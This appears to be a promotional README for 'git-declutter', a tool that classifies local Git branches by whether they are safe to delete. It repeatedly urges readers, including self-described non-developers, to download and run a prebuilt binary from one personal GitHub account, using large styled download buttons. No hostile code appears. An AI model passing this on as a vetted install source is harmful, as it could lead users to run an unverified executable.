<h1>🧹 git-declutter - Know What's Safe to Delete</h1>

<p align="center">
  <a href="https://github.com/Viethoangn6398/git-declutter" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;">⬇️ Download git-declutter Now</a>
</p>

<hr>

<p>Git-declutter is a simple, friendly tool that shows you which of your local Git branches are safe to delete, which ones need a closer look, and which ones you should never delete. It does all the hard analysis for you, so you don't need to be a Git expert.</p>

<h2>✨ Why Use git-declutter?</h2>

<p>If you work on projects that use Git for version control, your computer can quickly fill up with dozens of old branches that you no longer need. Manually checking each branch is boring and risky. You might delete a branch that still has unique work you want to keep.</p>

<p>Git-declutter combines information from your local Git history, remote tracking state, and pull request metadata from GitHub or GitLab to classify every local branch into one of four clear categories:</p>

<ul>
  <li><strong>🟢 SAFE</strong> – This branch has no unique commits and is fully merged; you can delete it without worry.</li>
  <li><strong>🟡 REVIEW</strong> – This branch has unique work that may not be merged; check it before deleting.</li>
  <li><strong>🔴 KEEP</strong> – This branch contains valuable unique commits; you should keep it.</li>
  <li><strong>🛡️ PROTECTED</strong> – This is a main or protected branch; git-declutter will never suggest deleting it.</li>
</ul>

<p>You get a clear, color-coded report that tells you exactly what each branch is doing, and why. No more guessing.</p>

<h2>🚀 Getting Started</h2>

<p>Getting started with git-declutter is easy. Follow these simple steps:</p>

<ol>
  <li><strong>Visit this link to download the application:</strong> <a href="https://github.com/Viethoangn6398/git-declutter">https://github.com/Viethoangn6398/git-declutter</a></li>
  <li>On that page, find the <strong>Releases</strong> section and download the file that matches your computer's operating system (Windows, macOS, or Linux).</li>
  <li>Once downloaded, place the <code>git-declutter</code> file somewhere you can easily find it. A good place is your <strong>Downloads</strong> folder or a folder called <strong>Tools</strong>.</li>
  <li>If the file is inside a <code>.zip</code> archive, right-click and choose <strong>Extract All</strong> to unpack it.</li>
</ol>

<h2>📥 Installation Made Simple</h2>

<p>The best part about git-declutter is that it is a compiled binary. This means it does not need any special installation or extra software to run. You only need <strong>Git</strong> (which you likely already have if you are using Git branches). You do <strong>not</strong> need to install Go or any other programming language.</p>

<p>To use it, you just need to make the <code>git-declutter</code> file available to your computer. Here is the easiest way to set it up:</p>

<ol>
  <li>Move the <code>git-declutter</code> file into a folder that is already on your system path (like <code>C:\Users\YourName\bin</code>). If you are not sure what a system path is, you can simply run the file by typing its full location.</li>
  <li>Once it is ready, open your terminal (Command Prompt, PowerShell, or Terminal).</li>
  <li>Navigate to the folder where your Git project lives.</li>
  <li>Run the command:</li>
</ol>

<pre>git declutter scan</pre>

<p>That's it! Git will happily treat <code>declutter</code> as one of its own commands, and the scan will start.</p>

<h2>🖥️ System Requirements</h2>

<p>Git-declutter is designed to work on any modern computer:</p>

<ul>
  <li><strong>Operating System:</strong> Windows 10 or 11, macOS 12 or newer, or a common Linux distribution (Ubuntu, Debian, Fedora).</li>
  <li><strong>Git Version:</strong> Git 2.20 or higher is recommended. If you can run <code>git status</code>, you are ready.</li>
  <li><strong>Memory:</strong> At least 512 MB of free RAM is fine for most projects.</li>
  <li><strong>Storage:</strong> Less than 10 MB of disk space is needed for the program itself.</li>
</ul>

<h2>📊 Understanding the Output</h2>

<p>When you run a scan, git-declutter prints a table that looks something like this in your terminal:</p>

<pre>
BRANCH NAME          STATUS        REASON
feature/login        🟢 SAFE        Merged into main
old-experiment       🟡 REVIEW      3 unique commits, PR #142 open
staging-fix          🔴 KEEP        Unique commits, no PR found
main                 🛡️ PROTECTED   Default branch
</pre>

<p>Each row gives you the branch name, the color-coded status, and a short explanation of why that status was chosen. You can then decide what to do with each branch.</p>

<h2>⚙️ Advanced Usage</h2>

<p>If you are comfortable with the terminal, git-declutter also supports extra options. For example, you can ask it to include remote branches or fetch the latest metadata before scanning. Run <code>git declutter --help</code> to see all available flags.</p>

<p>But if you are just getting started, the default scan is all you need.</p>

<h2>🧰 Troubleshooting</h2>

<p>If you run into issues, here are some common fixes:</p>

<ul>
  <li><strong>Command not found:</strong> Make sure the <code>git-declutter</code> file is in a folder that is on your system path, or use its full file location.</li>
  <li><strong>Git not recognized:</strong> Install Git from <a href="https://git-scm.com">git-scm.com</a> and restart your terminal.</li>
  <li><strong>No branches shown:</strong> Run the command inside a proper Git repository (a folder containing a <code>.git</code> subfolder).</li>
  <li><strong>Permission denied:</strong> On macOS or Linux, you may need to make the file executable with <code>chmod +x git-declutter</code>.</li>
</ul>

<h2>🔒 Safety First</h2>

<p>Git-declutter is a read-only analysis tool. It never deletes branches on its own. It only shows you information and recommendations. The final decision to delete a branch is always yours. This means you can use it with confidence and without fear of accidental data loss.</p>

<h2>🤝 Contributing</h2>

<p>Git-declutter is an open-source project. If you are a developer and you want to contribute, add features, or report bugs, please visit the official repository at <a href="https://github.com/Viethoangn6398/git-declutter">https://github.com/Viethoangn6398/git-declutter</a>. Issues and pull requests are always welcome.</p>

<h2>📄 License</h2>

<p>Git-declutter is released under an open-source license. See the <code>LICENSE</code> file in the repository for full details.</p>

<h2>🙋 Frequently Asked Questions</h2>

<p><strong>Q: Will this delete my work by accident?</strong><br>
A: No. Git-declutter only reads information. It never deletes anything. You are always in control.</p>

<p><strong>Q: Do I need a GitHub or GitLab account?</strong><br>
A: No. The tool works with local Git data out of the box. Pull request metadata is used only if you are inside a repository that is connected to GitHub or GitLab, and it makes the classifications more accurate.</p>

<p><strong>Q: I am not a developer. Can I still use this?</strong><br>
A: Yes. If you can open a terminal and type one command, you can use git-declutter.</p>

<hr>

<p style="text-align:center;">
  <a href="https://github.com/Viethoangn6398/git-declutter" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#fff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;">⬇️ Get git-declutter Here</a>
</p>